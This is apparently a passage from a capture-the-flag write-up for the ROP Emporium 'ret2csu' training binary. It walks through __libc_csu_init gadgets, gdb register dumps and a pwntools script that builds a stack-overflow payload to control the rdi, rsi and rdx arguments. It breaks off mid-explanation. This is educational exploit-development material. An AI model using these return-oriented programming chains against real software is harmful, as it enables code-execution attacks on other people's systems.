+  <span style="color:#ef6155">400652:</span>	<span style="color:#ef6155">55</span>                   	<span style="color:#06b6ef">push</span>   rbp
+  <span style="color:#ef6155">400653:</span>	<span style="color:#ef6155">48</span> <span style="color:#ef6155">8</span><span style="color:#06b6ef">d</span> <span style="color:#f99b15">2</span><span style="color:#ef6155">d</span> <span style="color:#f99b15">9</span><span style="color:#ef6155">e</span> <span style="color:#f99b15">07</span> <span style="color:#f99b15">20</span> <span style="color:#f99b15">00</span> 	<span style="color:#ef6155">lea</span>    rbp,[<span style="color:#ef6155">rip</span><span style="color:#5bc4bf">+</span><span style="color:#f99b15">0x20079e</span>]        <span style="color:#ef6155">#</span> <span style="color:#f99b15">600</span><span style="color:#ef6155">df8</span> <span style="color:#5bc4bf">&lt;</span><span style="color:#ef6155">__do_global_dtors_aux_fini_array_entry</span><span style="color:#5bc4bf">&gt;</span>
+  <span style="color:#ef6155">40065</span>a:	<span style="color:#ef6155">53</span>                   	<span style="color:#06b6ef">push</span>   rbx
+  <span style="color:#ef6155">40065</span>b:	<span style="color:#ef6155">41</span> <span style="color:#ef6155">89</span> <span style="color:#06b6ef">fd</span>             	<span style="color:#ef6155">mov</span>    r13d,edi
+  <span style="color:#ef6155">40065</span>e:	<span style="color:#ef6155">49</span> <span style="color:#ef6155">89</span> <span style="color:#06b6ef">f6</span>             	<span style="color:#ef6155">mov</span>    <span style="color:#ef6155">r14</span>,rsi
+  <span style="color:#ef6155">400661:</span>	<span style="color:#ef6155">4</span><span style="color:#06b6ef">c</span> <span style="color:#f99b15">29</span> <span style="color:#ef6155">e5</span>             	<span style="color:#ef6155">sub</span>    rbp,<span style="color:#ef6155">r12</span>
+  <span style="color:#ef6155">400664:</span>	<span style="color:#ef6155">48</span> <span style="color:#ef6155">83</span> <span style="color:#06b6ef">ec</span> <span style="color:#f99b15">08</span>          	<span style="color:#ef6155">sub</span>    rsp,<span style="color:#f99b15">0x8</span>
+  <span style="color:#ef6155">400668:</span>	<span style="color:#ef6155">48</span> <span style="color:#06b6ef">c1</span> <span style="color:#ef6155">fd</span> <span style="color:#f99b15">03</span>          	<span style="color:#ef6155">sar</span>    rbp,<span style="color:#f99b15">0x3</span>
+  <span style="color:#ef6155">40066</span>c:	<span style="color:#06b6ef">e8</span> <span style="color:#f99b15">5</span><span style="color:#ef6155">f</span> <span style="color:#ef6155">fe</span> <span style="color:#ef6155">ff</span> <span style="color:#ef6155">ff</span>       	<span style="color:#ef6155">call</span>   <span style="color:#f99b15">4004</span><span style="color:#ef6155">d0</span> <span style="color:#5bc4bf">&lt;</span><span style="color:#ef6155">_init</span><span style="color:#5bc4bf">&gt;</span>
+  <span style="color:#ef6155">400671:</span>	<span style="color:#ef6155">48</span> <span style="color:#ef6155">85</span> <span style="color:#06b6ef">ed</span>             	<span style="color:#ef6155">test</span>   rbp,rbp
+  <span style="color:#ef6155">400674:</span>	<span style="color:#ef6155">74</span> <span style="color:#ef6155">20</span>                	<span style="color:#06b6ef">je</span>     <span style="color:#f99b15">400696</span> <span style="color:#5bc4bf">&lt;</span><span style="color:#ef6155">__libc_csu_init</span><span style="color:#5bc4bf">+</span><span style="color:#f99b15">0x56</span><span style="color:#5bc4bf">&gt;</span>
+  <span style="color:#ef6155">400676:</span>	<span style="color:#ef6155">31</span> <span style="color:#815ba4">db</span>                	<span style="color:#ef6155">xor</span>    ebx,ebx
+  <span style="color:#ef6155">400678:</span>	<span style="color:#ef6155">0</span><span style="color:#06b6ef">f</span> <span style="color:#f99b15">1</span><span style="color:#ef6155">f</span> <span style="color:#f99b15">84</span> <span style="color:#f99b15">00</span> <span style="color:#f99b15">00</span> <span style="color:#f99b15">00</span> <span style="color:#f99b15">00</span> 	<span style="color:#ef6155">nop</span>    <span style="color:#fec418">DWORD</span> <span style="color:#ef6155">PTR</span> [rax<span style="color:#5bc4bf">+</span>rax<span style="color:#5bc4bf">*</span><span style="color:#f99b15">1</span><span style="color:#5bc4bf">+</span><span style="color:#f99b15">0x0</span>]
+  <span style="color:#ef6155">40067</span>f:	<span style="color:#ef6155">00</span> 
+  <span style="color:#ef6155">400680:</span>	<span style="color:#ef6155">4</span><span style="color:#06b6ef">c</span> <span style="color:#f99b15">89</span> <span style="color:#ef6155">fa</span>             	<span style="color:#ef6155">mov</span>    rdx,<span style="color:#ef6155">r15</span>
+  <span style="color:#ef6155">400683:</span>	<span style="color:#ef6155">4</span><span style="color:#06b6ef">c</span> <span style="color:#f99b15">89</span> <span style="color:#ef6155">f6</span>             	<span style="color:#ef6155">mov</span>    rsi,<span style="color:#ef6155">r14</span>
+  <span style="color:#ef6155">400686:</span>	<span style="color:#ef6155">44</span> <span style="color:#ef6155">89</span> <span style="color:#06b6ef">ef</span>             	<span style="color:#ef6155">mov</span>    edi,r13d
+  <span style="color:#ef6155">400689:</span>	<span style="color:#ef6155">41</span> <span style="color:#06b6ef">ff</span> <span style="color:#f99b15">14</span> <span style="color:#ef6155">dc</span>          	<span style="color:#ef6155">call</span>   <span style="color:#fec418">QWORD</span> <span style="color:#ef6155">PTR</span> [<span style="color:#ef6155">r12</span><span style="color:#5bc4bf">+</span>rbx<span style="color:#5bc4bf">*</span><span style="color:#f99b15">8</span>]
+  <span style="color:#ef6155">40068</span>d:	<span style="color:#ef6155">48</span> <span style="color:#ef6155">83</span> <span style="color:#06b6ef">c3</span> <span style="color:#f99b15">01</span>          	<span style="color:#ef6155">add</span>    rbx,<span style="color:#f99b15">0x1</span>
+  <span style="color:#ef6155">400691:</span>	<span style="color:#ef6155">48</span> <span style="color:#ef6155">39</span> <span style="color:#815ba4">dd</span>             	<span style="color:#ef6155">cmp</span>    rbp,rbx
+  <span style="color:#ef6155">400694:</span>	<span style="color:#ef6155">75</span> <span style="color:#06b6ef">ea</span>                	<span style="color:#ef6155">jne</span>    <span style="color:#f99b15">400680</span> <span style="color:#5bc4bf">&lt;</span><span style="color:#ef6155">__libc_csu_init</span><span style="color:#5bc4bf">+</span><span style="color:#f99b15">0x40</span><span style="color:#5bc4bf">&gt;</span>
+  <span style="color:#ef6155">400696:</span>	<span style="color:#ef6155">48</span> <span style="color:#ef6155">83</span> <span style="color:#06b6ef">c4</span> <span style="color:#f99b15">08</span>          	<span style="color:#ef6155">add</span>    rsp,<span style="color:#f99b15">0x8</span>
+  <span style="color:#ef6155">40069</span>a:	<span style="color:#ef6155">5</span><span style="color:#06b6ef">b</span>                   	<span style="color:#ef6155">pop</span>    rbx
+  <span style="color:#ef6155">40069</span>b:	<span style="color:#ef6155">5</span><span style="color:#06b6ef">d</span>                   	<span style="color:#ef6155">pop</span>    rbp
+  <span style="color:#ef6155">40069</span>c:	<span style="color:#ef6155">41</span> <span style="color:#ef6155">5</span><span style="color:#06b6ef">c</span>                	<span style="color:#ef6155">pop</span>    <span style="color:#ef6155">r12</span>
+  <span style="color:#ef6155">40069</span>e:	<span style="color:#ef6155">41</span> <span style="color:#ef6155">5</span><span style="color:#06b6ef">d</span>                	<span style="color:#ef6155">pop</span>    <span style="color:#ef6155">r13</span>
+  <span style="color:#ef6155">4006</span>a0:	<span style="color:#ef6155">41</span> <span style="color:#ef6155">5</span><span style="color:#06b6ef">e</span>                	<span style="color:#ef6155">pop</span>    <span style="color:#ef6155">r14</span>
+  <span style="color:#ef6155">4006</span>a2:	<span style="color:#ef6155">41</span> <span style="color:#ef6155">5</span><span style="color:#06b6ef">f</span>                	<span style="color:#ef6155">pop</span>    <span style="color:#ef6155">r15</span>
+  <span style="color:#ef6155">4006</span>a4:	<span style="color:#06b6ef">c3</span>                   	<span style="color:#ef6155">ret</span>    
+  <span style="color:#ef6155">4006</span>a5:	<span style="color:#ef6155">90</span>                   	<span style="color:#06b6ef">nop</span>
+  <span style="color:#ef6155">4006</span>a6:	<span style="color:#ef6155">66</span> <span style="color:#ef6155">2</span><span style="color:#06b6ef">e</span> <span style="color:#f99b15">0</span><span style="color:#ef6155">f</span> <span style="color:#f99b15">1</span><span style="color:#ef6155">f</span> <span style="color:#f99b15">84</span> <span style="color:#f99b15">00</span> <span style="color:#f99b15">00</span> 	cs <span style="color:#ef6155">nop</span> <span style="color:#fec418">WORD</span> <span style="color:#ef6155">PTR</span> [rax<span style="color:#5bc4bf">+</span>rax<span style="color:#5bc4bf">*</span><span style="color:#f99b15">1</span><span style="color:#5bc4bf">+</span><span style="color:#f99b15">0x0</span>]
+  <span style="color:#ef6155">4006</span>ad:	<span style="color:#ef6155">00</span> <span style="color:#ef6155">00</span> <span style="color:#ef6155">00</span> 
+
+<span style="color:#ef6155">00000000004006</span><span style="color:#06b6ef">b0</span> <span style="color:#5bc4bf">&lt;</span><span style="color:#ef6155">__libc_csu_fini</span><span style="color:#5bc4bf">&gt;</span>:
+  <span style="color:#ef6155">4006</span>b0:	<span style="color:#06b6ef">f3</span> <span style="color:#ef6155">c3</span>                	<span style="color:#ef6155">repz</span> <span style="color:#ef6155">ret</span> <span style="color:#ef6155">z</span>
+</code></pre></div><p>The <strong>__libc_csu_init</strong>  section contains a sequence of pop, ret instructions  which makes it a good attack vector for our rop chain. The gadgets present in this section enables us to control <strong>RBX, RBP, R12, R13, R14, and R15</strong> registers. From the ret-to-csu referenced paper this makes it a perfect candidate for our first stage and second stage rop chain.</p>
+<p>The first stage gadget is shown in disassembled code below. This enables us to control the registers with the values we want, which makes our second stage gadget more controllable.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm">  <span style="color:#ef6155">40069</span>a:	<span style="color:#ef6155">5</span><span style="color:#06b6ef">b</span>                   	<span style="color:#ef6155">pop</span>    rbx
+  <span style="color:#ef6155">40069</span>b:	<span style="color:#ef6155">5</span><span style="color:#06b6ef">d</span>                   	<span style="color:#ef6155">pop</span>    rbp
+  <span style="color:#ef6155">40069</span>c:	<span style="color:#ef6155">41</span> <span style="color:#ef6155">5</span><span style="color:#06b6ef">c</span>                	<span style="color:#ef6155">pop</span>    <span style="color:#ef6155">r12</span>
+  <span style="color:#ef6155">40069</span>e:	<span style="color:#ef6155">41</span> <span style="color:#ef6155">5</span><span style="color:#06b6ef">d</span>                	<span style="color:#ef6155">pop</span>    <span style="color:#ef6155">r13</span> 
+  <span style="color:#ef6155">4006</span>a0:	<span style="color:#ef6155">41</span> <span style="color:#ef6155">5</span><span style="color:#06b6ef">e</span>                	<span style="color:#ef6155">pop</span>    <span style="color:#ef6155">r14</span>
+  <span style="color:#ef6155">4006</span>a2:	<span style="color:#ef6155">41</span> <span style="color:#ef6155">5</span><span style="color:#06b6ef">f</span>                	<span style="color:#ef6155">pop</span>    <span style="color:#ef6155">r15</span>
+  <span style="color:#ef6155">4006</span>a4:	<span style="color:#06b6ef">c3</span>                   	<span style="color:#ef6155">ret</span>    
+</code></pre></div><p>For the second stage, we need to look for the gadgets that will enable us to control the  <strong>RDI, RSI and RDX</strong> registers in that order. This is because of x86_64 calling convention, the first three arguments to a function are passed in <strong>RDI, RSI and RDX</strong> registers respectively. From the disassembly of <strong>__libc_csu_init</strong> we can get our second gadget to build our rop chain.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#06b6ef">mov</span>    rdx,<span style="color:#ef6155">r15</span>
+<span style="color:#06b6ef">mov</span>    rsi,<span style="color:#ef6155">r14</span>
+<span style="color:#06b6ef">mov</span>    edi,r13d
+<span style="color:#06b6ef">call</span>   <span style="color:#fec418">QWORD</span> <span style="color:#ef6155">PTR</span> [<span style="color:#ef6155">r12</span><span style="color:#5bc4bf">+</span>rbx<span style="color:#5bc4bf">*</span><span style="color:#f99b15">8</span>]
+</code></pre></div><p>From the above code, we are now able to control the <strong>rdx, rsi and edi</strong> registers.The call in the second stage gadgets, calculates the destination address of our code.</p>
+<p>Because we have all the gadgets we need to build our rop chain. From the authors website, the challenge is very similar to <strong>ret2win</strong> challenge.</p>
+<blockquote>
+<p>This challenge is very similar to &ldquo;callme&rdquo;, with the exception of the useful gadgets. Simply call the ret2win() function in the accompanying library with same arguments that you used to beat the &ldquo;callme&rdquo; challenge (ret2win(0xdeadbeef, 0xcafebabe, 0xd00df00d) for the ARM &amp; MIPS binaries, ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d) for the x86_64 binary.</p>
+</blockquote>
+<p>From the description, we want to pass three arguments to ret2win function. The arguments will be passed to rdi, rsi and rdx  respectively. Because we don`t control the these registers directly, we need to set these arguments in the first rop chain that will enable us to control the rdi, rsi and rdx in the second gadget.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#06b6ef">rdi</span> <span style="color:#5bc4bf">&lt;--</span> <span style="color:#ef6155">r13</span> <span style="color:#5bc4bf">&lt;--</span>  <span style="color:#ef6155">#</span><span style="color:#ef6155">first</span> <span style="color:#ef6155">args</span>   <span style="color:#f99b15">0xdeadbeefdeadbeef</span>
+<span style="color:#06b6ef">rsi</span> <span style="color:#5bc4bf">&lt;--</span> <span style="color:#ef6155">r14</span> <span style="color:#5bc4bf">&lt;--</span>  <span style="color:#ef6155">#</span><span style="color:#ef6155">second</span> <span style="color:#ef6155">args</span>  <span style="color:#f99b15">0xcafebabecafebabe</span>
+<span style="color:#06b6ef">rdx</span> <span style="color:#5bc4bf">&lt;--</span> <span style="color:#ef6155">r15</span> <span style="color:#5bc4bf">&lt;--</span>  <span style="color:#ef6155">#</span><span style="color:#ef6155">third</span> <span style="color:#ef6155">args</span>   <span style="color:#f99b15">0xd00df00dd00df00d</span>
+</code></pre></div><p>From the code snip above, we are now able to control the values of ropchain by setting the registers values as shown in the code above.
+For debugging our exploit we will use python3 and gdb. Debugging our exploit ensures that there is no unexpected behavior in the code to avoid crashing of the program.</p>
+<p>For debugging purposes, we set a breakpoint in our first address of the ropchain gadget, and run our program with the generated payload.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#ef6155">(</span><span style="color:#06b6ef">gdb</span>) <span style="color:#ef6155">break</span> <span style="color:#5bc4bf">*</span><span style="color:#f99b15">0x000000000040069a</span>
+<span style="color:#06b6ef">Breakpoint</span> <span style="color:#f99b15">1</span> <span style="color:#ef6155">at</span> <span style="color:#f99b15">0x40069a</span>
+<span style="color:#ef6155">(</span><span style="color:#06b6ef">gdb</span>) <span style="color:#ef6155">r</span> <span style="color:#5bc4bf">&lt;/</span><span style="color:#ef6155">tmp</span><span style="color:#5bc4bf">/</span><span style="color:#ef6155">payload</span>
+<span style="color:#06b6ef">Starting</span> <span style="color:#ef6155">program</span>: <span style="color:#5bc4bf">/</span><span style="color:#ef6155">home</span><span style="color:#5bc4bf">/</span><span style="color:#ef6155">vx</span><span style="color:#5bc4bf">/</span><span style="color:#ef6155">Downloads</span><span style="color:#5bc4bf">/</span><span style="color:#ef6155">rop</span><span style="color:#5bc4bf">/</span><span style="color:#ef6155">rop</span><span style="color:#5bc4bf">/</span><span style="color:#ef6155">ret2csu</span><span style="color:#5bc4bf">/</span><span style="color:#ef6155">ret2csu</span> <span style="color:#5bc4bf">&lt;/</span><span style="color:#ef6155">tmp</span><span style="color:#5bc4bf">/</span><span style="color:#ef6155">payload</span>
+
+<span style="color:#06b6ef">Breakpoint</span> <span style="color:#f99b15">1</span>, <span style="color:#f99b15">0x000000000040069a</span> <span style="color:#ef6155">in</span> <span style="color:#ef6155">__libc_csu_init</span> ()
+<span style="color:#ef6155">(</span><span style="color:#06b6ef">gdb</span>) <span style="color:#ef6155">c</span>
+<span style="color:#06b6ef">Continuing.</span>
+<span style="color:#06b6ef">ret2csu</span> <span style="color:#ef6155">by</span> <span style="color:#ef6155">ROP</span> <span style="color:#ef6155">Emporium</span>
+<span style="color:#06b6ef">x86_64</span>
+
+<span style="color:#06b6ef">Check</span> <span style="color:#ef6155">out</span> <span style="color:#ef6155">https</span>:<span style="color:#5bc4bf">//</span><span style="color:#ef6155">ropemporium.com</span><span style="color:#5bc4bf">/</span>chal<span style="color:#ef6155">lenge</span><span style="color:#5bc4bf">/</span><span style="color:#ef6155">ret2csu.html</span> <span style="color:#ef6155">for</span> <span style="color:#ef6155">information</span> <span style="color:#ef6155">on</span> <span style="color:#ef6155">how</span> <span style="color:#ef6155">to</span> <span style="color:#ef6155">solve</span> <span style="color:#ef6155">this</span> chal<span style="color:#ef6155">lenge.</span>
+
+<span style="color:#ef6155">&gt;</span> <span style="color:#06b6ef">Thank</span> <span style="color:#ef6155">you</span><span style="color:#ef6155">!</span>
+
+<span style="color:#06b6ef">Breakpoint</span> <span style="color:#f99b15">1</span>, <span style="color:#f99b15">0x000000000040069a</span> <span style="color:#ef6155">in</span> <span style="color:#ef6155">__libc_csu_init</span> ()
+<span style="color:#ef6155">(</span><span style="color:#06b6ef">gdb</span>) 
+</code></pre></div><p>When the program is run,its hits the breakpoint. We enter <strong>c</strong> command for continue, to continue the execution of our program. When the program finishes the execution, the return address now points back to the address of our first gadget, Because of the breakpoint, the execution stops. Now we can inspect the memory addresses in order to understand the behavior of the program and the values loaded in the registers loaded in our first chain.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#ef6155">(</span><span style="color:#06b6ef">gdb</span>) <span style="color:#ef6155">x</span><span style="color:#5bc4bf">/</span><span style="color:#f99b15">10</span><span style="color:#ef6155">i</span> <span style="color:#815ba4">$</span><span style="color:#ef6155">rip</span>
+<span style="color:#ef6155">=&gt;</span> <span style="color:#ef6155">0</span><span style="color:#06b6ef">x40069a</span> <span style="color:#5bc4bf">&lt;</span><span style="color:#ef6155">__libc_csu_init</span><span style="color:#5bc4bf">+</span><span style="color:#f99b15">90</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">pop</span>    rbx
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x40069b</span> <span style="color:#5bc4bf">&lt;</span><span style="color:#ef6155">__libc_csu_init</span><span style="color:#5bc4bf">+</span><span style="color:#f99b15">91</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">pop</span>    rbp
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x40069c</span> <span style="color:#5bc4bf">&lt;</span><span style="color:#ef6155">__libc_csu_init</span><span style="color:#5bc4bf">+</span><span style="color:#f99b15">92</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">pop</span>    <span style="color:#ef6155">r12</span>
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x40069e</span> <span style="color:#5bc4bf">&lt;</span><span style="color:#ef6155">__libc_csu_init</span><span style="color:#5bc4bf">+</span><span style="color:#f99b15">94</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">pop</span>    <span style="color:#ef6155">r13</span>
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x4006a0</span> <span style="color:#5bc4bf">&lt;</span><span style="color:#ef6155">__libc_csu_init</span><span style="color:#5bc4bf">+</span><span style="color:#f99b15">96</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">pop</span>    <span style="color:#ef6155">r14</span>
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x4006a2</span> <span style="color:#5bc4bf">&lt;</span><span style="color:#ef6155">__libc_csu_init</span><span style="color:#5bc4bf">+</span><span style="color:#f99b15">98</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">pop</span>    <span style="color:#ef6155">r15</span>
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x4006a4</span> <span style="color:#5bc4bf">&lt;</span><span style="color:#ef6155">__libc_csu_init</span><span style="color:#5bc4bf">+</span><span style="color:#f99b15">100</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">ret</span>    
+   <span style="color:#ef6155">0</span>x4006a5:	<span style="color:#06b6ef">nop</span>
+   <span style="color:#ef6155">0</span>x4006a6:	<span style="color:#06b6ef">nop</span>    <span style="color:#fec418">WORD</span> <span style="color:#ef6155">PTR</span> cs:[rax<span style="color:#5bc4bf">+</span>rax<span style="color:#5bc4bf">*</span><span style="color:#f99b15">1</span><span style="color:#5bc4bf">+</span><span style="color:#f99b15">0x0</span>]
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x4006b0</span> <span style="color:#5bc4bf">&lt;</span><span style="color:#ef6155">__libc_csu_fini</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">repz</span> <span style="color:#ef6155">ret</span> 
+</code></pre></div><p>Now we can Single step through our assembly code and view the value stored in the register values of our gadget. The command for single stepping in gdb is <strong>si</strong>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#ef6155">(</span><span style="color:#06b6ef">gdb</span>) <span style="color:#ef6155">i</span> <span style="color:#ef6155">r</span> rbx rbp <span style="color:#ef6155">r12</span> <span style="color:#ef6155">r13</span> <span style="color:#ef6155">r14</span> <span style="color:#ef6155">r15</span>
+<span style="color:#06b6ef">rbx</span>            <span style="color:#f99b15">0x4343434343434343</span>  <span style="color:#f99b15">4846791580151137091</span>
+<span style="color:#06b6ef">rbp</span>            <span style="color:#f99b15">0x4242424242424242</span>  <span style="color:#f99b15">0x4242424242424242</span>
+<span style="color:#06b6ef">r12</span>            <span style="color:#f99b15">0x4141414141414141</span>  <span style="color:#f99b15">4702111234474983745</span>
+<span style="color:#06b6ef">r13</span>            <span style="color:#f99b15">0xdeadbeefdeadbeef</span>  <span style="color:#5bc4bf">-</span><span style="color:#f99b15">2401053088876216593</span>
+<span style="color:#06b6ef">r14</span>            <span style="color:#f99b15">0xcafebabecafebabe</span>  <span style="color:#5bc4bf">-</span><span style="color:#f99b15">3819410105351357762</span>
+<span style="color:#06b6ef">r15</span>            <span style="color:#f99b15">0xd00df00dd00df00d</span>  <span style="color:#5bc4bf">-</span><span style="color:#f99b15">3454841397007486963</span>
+<span style="color:#ef6155">(</span><span style="color:#06b6ef">gdb</span>) 
+</code></pre></div><p>From the analysis, we are able to control all the register value in our chain using our generated payload file. The code for generating the payload is shown below.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#815ba4">import</span> <span style="color:#ef6155">pwn</span>
+
+<span style="color:#06b6ef">pop_gadget</span> <span style="color:#ef6155">=</span> <span style="color:#ef6155">pwn.p64</span>(<span style="color:#f99b15">0x0040069a</span>)
+<span style="color:#06b6ef">payload</span> <span style="color:#ef6155">=</span><span style="color:#ef6155">b</span><span style="color:#48b685">&#34;A&#34;</span><span style="color:#5bc4bf">*</span><span style="color:#f99b15">32</span> <span style="color:#ef6155">#</span><span style="color:#ef6155">fill</span> <span style="color:#ef6155">the</span> <span style="color:#ef6155">buffer</span>
+<span style="color:#06b6ef">payload</span> <span style="color:#5bc4bf">+</span><span style="color:#ef6155">=</span><span style="color:#ef6155">b</span><span style="color:#48b685">&#34;B&#34;</span><span style="color:#5bc4bf">*</span><span style="color:#f99b15">8</span> <span style="color:#ef6155">#</span>rbp(<span style="color:#ef6155">saved</span>)
+<span style="color:#06b6ef">payload</span> <span style="color:#5bc4bf">+</span><span style="color:#ef6155">=</span> <span style="color:#ef6155">pop_gadget</span>  <span style="color:#ef6155">#</span><span style="color:#ef6155">retaddr</span>
+<span style="color:#06b6ef">payload</span> <span style="color:#5bc4bf">+</span><span style="color:#ef6155">=</span> <span style="color:#ef6155">pwn.p64</span>(<span style="color:#f99b15">0x4343434343434343</span>)<span style="color:#ef6155">#</span>rbx
+<span style="color:#06b6ef">payload</span> <span style="color:#5bc4bf">+</span><span style="color:#ef6155">=</span> <span style="color:#ef6155">pwn.p64</span>(<span style="color:#f99b15">0x4242424242424242</span>)<span style="color:#ef6155">#</span>rbp
+<span style="color:#06b6ef">payload</span> <span style="color:#5bc4bf">+</span><span style="color:#ef6155">=</span> <span style="color:#ef6155">pwn.p64</span>(<span style="color:#f99b15">0x4141414141414141</span>) <span style="color:#ef6155">#</span><span style="color:#ef6155">r12</span>
+<span style="color:#06b6ef">payload</span> <span style="color:#5bc4bf">+</span><span style="color:#ef6155">=</span> <span style="color:#ef6155">pwn.p64</span>(<span style="color:#f99b15">0xdeadbeefdeadbeef</span>) <span style="color:#ef6155">#</span><span style="color:#ef6155">r13</span>
+<span style="color:#06b6ef">payload</span> <span style="color:#5bc4bf">+</span><span style="color:#ef6155">=</span> <span style="color:#ef6155">pwn.p64</span>(<span style="color:#f99b15">0xcafebabecafebabe</span>) <span style="color:#ef6155">#</span><span style="color:#ef6155">r14</span>
+<span style="color:#06b6ef">payload</span> <span style="color:#5bc4bf">+</span><span style="color:#ef6155">=</span> <span style="color:#ef6155">pwn.p64</span>(<span style="color:#f99b15">0xd00df00dd00df00d</span>) <span style="color:#ef6155">#</span><span style="color:#ef6155">r15</span>
+
+<span style="color:#06b6ef">open</span>(<span style="color:#48b685">&#39;payload&#39;</span>, <span style="color:#48b685">&#39;wb&#39;</span>)<span style="color:#ef6155">.write</span>(<span style="color:#ef6155">payload</span>)
+</code></pre></div><p>Now, because we are able to control the registers we want, we need to determine the correct or desired values for <strong>rbx, rbp and r12</strong> registers because 0x41&hellip;,  0x42&hellip;., 0x43&hellip; are not valid memory addresses. Because after execution of our second rop gadget, we need to set right values of rbp and rbx due to a loop conditional.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm">   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000400680</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">64</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">mov</span>    rdx,<span style="color:#ef6155">r15</span>
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000400683</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">67</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">mov</span>    rsi,<span style="color:#ef6155">r14</span>
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000400686</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">70</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">mov</span>    edi,r13d
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000400689</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">73</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">call</span>   <span style="color:#fec418">QWORD</span> <span style="color:#ef6155">PTR</span> [<span style="color:#ef6155">r12</span><span style="color:#5bc4bf">+</span>rbx<span style="color:#5bc4bf">*</span><span style="color:#f99b15">8</span>]
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x000000000040068d</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">77</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">add</span>    rbx,<span style="color:#f99b15">0x1</span>
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000400691</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">81</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">cmp</span>    rbp,rbx
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000400694</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">84</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">jne</span>    <span style="color:#f99b15">0x400680</span> <span style="color:#5bc4bf">&lt;</span><span style="color:#ef6155">__libc_csu_init</span><span style="color:#5bc4bf">+</span><span style="color:#f99b15">64</span><span style="color:#5bc4bf">&gt;</span>
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000400696</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">86</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">add</span>    rsp,<span style="color:#f99b15">0x8</span>
+</code></pre></div><p>The address of second gadget starts at <strong>0x0000000000400680</strong>,in which we are setting the values of rdi,r14 and rdx with correct argument values. we need to set the values of <strong>rbx</strong> and <strong>rbp</strong> correctly so that conditional <strong>cmp</strong> is always true. Because of add instruction of 1 to rbx, we need to set the rbx value to 0 and rbp value to 1. when the comparison is being done, the values are equal and Zero flag is set. Adjust values in payload script and single step to confirm the validity of new values in the memory.</p>
+<p>For register <strong>r12</strong>, we set the value to a memory region that is executable. In the binary, the <strong>.bss</strong> section is executable. we now set the r12 register with the memory address of bss section. After executing our second rop chain gadget, we need to adjust the stack as shown in the exploit code to avoid segmentation fault.</p>
+<p>Lastly we need to control the <strong>rdi</strong> register with the value <strong>0xdeadbeefdeadbeef</strong>. Because we have full control of rdx and rsi register, we need to look for <strong>pop rdi, ret</strong> gadget.</p>
+<p>The pop rdi, ret gadget</p>
